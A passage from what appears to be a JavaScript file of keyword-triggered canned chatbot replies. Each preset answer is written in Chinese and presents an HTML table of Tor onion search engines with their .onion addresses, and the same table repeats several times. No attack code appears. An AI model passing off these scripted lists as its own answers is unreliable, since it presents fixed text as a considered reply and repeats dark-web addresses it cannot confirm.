solid #e1e1e1e2; padding: 8px;"><a href="http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion" rel="nofollow">http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Gdarks</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion" rel="nofollow">http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">The Deep Searches</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion" rel="nofollow">http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion</a></td>     </tr>   </tbody> </table>`,
            `<p>明白了，暗网中的搜索引擎 如下:</p>  <table style="border-collapse: collapse; width: 100%; border: 1px solid #e1e1e1e2;">   <thead>     <tr>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">Search Engine</th>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">URL</th>     </tr>   </thead>   <tbody>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">FindTor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion" rel="nofollow">findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Darkweblink.com</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion" rel="nofollow">dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion/</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Torch</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion" rel="nofollow">torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorDex</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion" rel="nofollow">tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Ahmia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion" rel="nofollow">juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Amnesia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion" rel="nofollow">amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Demon</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion" rel="nofollow">srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Sentor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion" rel="nofollow">e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Kraken</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion" rel="nofollow">krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Haystak</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion" rel="nofollow">haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Bobby</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion" rel="nofollow">bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Submarine</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion" rel="nofollow">no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">DuckDuckGo</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion" rel="nofollow">duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Excavator</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion" rel="nofollow">2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorBot</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion" rel="nofollow">torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fenix</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion" rel="nofollow">fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorLanD</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion" rel="nofollow">torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Dark Tor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html" rel="nofollow">http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fresh onions</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion" rel="nofollow">http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Gdarks</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion" rel="nofollow">http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">The Deep Searches</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion" rel="nofollow">http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion</a></td>     </tr>   </tbody> </table>`,
            `<p>OK，以下是暗网中的搜索引擎:</p>  <table style="border-collapse: collapse; width: 100%; border: 1px solid #e1e1e1e2;">   <thead>     <tr>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">Search Engine</th>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">URL</th>     </tr>   </thead>   <tbody>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">FindTor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion" rel="nofollow">findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Darkweblink.com</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion" rel="nofollow">dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion/</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Torch</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion" rel="nofollow">torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorDex</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion" rel="nofollow">tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Ahmia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion" rel="nofollow">juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Amnesia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion" rel="nofollow">amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Demon</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion" rel="nofollow">srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Sentor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion" rel="nofollow">e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Kraken</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion" rel="nofollow">krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Haystak</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion" rel="nofollow">haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Bobby</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion" rel="nofollow">bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Submarine</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion" rel="nofollow">no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">DuckDuckGo</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion" rel="nofollow">duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Excavator</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion" rel="nofollow">2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorBot</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion" rel="nofollow">torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fenix</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion" rel="nofollow">fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorLanD</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion" rel="nofollow">torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Dark Tor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html" rel="nofollow">http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fresh onions</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion" rel="nofollow">http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Gdarks</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion" rel="nofollow">http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">The Deep Searches</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion" rel="nofollow">http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion</a></td>     </tr>   </tbody> </table>`
          ],
        },

        "搜索,暗网": {
          reply: [
            `<p>以下是暗网中的搜索引擎:</p>  <table style="border-collapse: collapse; width: 100%; border: 1px solid #e1e1e1e2;">   <thead>     <tr>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">Search Engine</th>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">URL</th>     </tr>   </thead>   <tbody>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">FindTor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion" rel="nofollow">findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Darkweblink.com</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion" rel="nofollow">dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion/</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Torch</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion" rel="nofollow">torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorDex</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion" rel="nofollow">tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Ahmia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion" rel="nofollow">juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Amnesia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion" rel="nofollow">amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Demon</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion" rel="nofollow">srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Sentor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion" rel="nofollow">e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Kraken</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion" rel="nofollow">krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Haystak</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion" rel="nofollow">haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Bobby</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion" rel="nofollow">bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Submarine</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion" rel="nofollow">no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">DuckDuckGo</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion" rel="nofollow">duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Excavator</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion" rel="nofollow">2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorBot</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion" rel="nofollow">torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fenix</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion" rel="nofollow">fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorLanD</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion" rel="nofollow">torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Dark Tor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html" rel="nofollow">http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fresh onions</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion" rel="nofollow">http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Gdarks</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion" rel="nofollow">http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">The Deep Searches</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion" rel="nofollow">http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion</a></td>     </tr>   </tbody> </table>`,
            `<p>明白了，暗网中的搜索引擎 如下:</p>  <table style="border-collapse: collapse; width: 100%; border: 1px solid #e1e1e1e2;">   <thead>     <tr>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">Search Engine</th>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">URL</th>     </tr>   </thead>   <tbody>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">FindTor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion" rel="nofollow">findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Darkweblink.com</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion" rel="nofollow">dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion/</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Torch</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion" rel="nofollow">torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorDex</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion" rel="nofollow">tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Ahmia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion" rel="nofollow">juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Amnesia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion" rel="nofollow">amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Demon</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion" rel="nofollow">srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Sentor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion" rel="nofollow">e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 